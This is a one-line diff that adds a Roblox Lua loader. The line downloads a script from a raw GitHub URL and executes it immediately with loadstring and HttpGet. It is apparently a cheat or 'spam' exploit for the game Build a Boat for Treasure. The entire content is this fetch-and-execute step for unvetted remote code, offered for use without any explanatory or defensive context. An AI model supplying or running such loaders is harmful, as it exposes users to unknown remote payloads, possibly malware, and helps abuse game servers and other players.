@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/build-a-boat-for-treasure-spam4-bk7cxofnj0l6wp.lua"))()
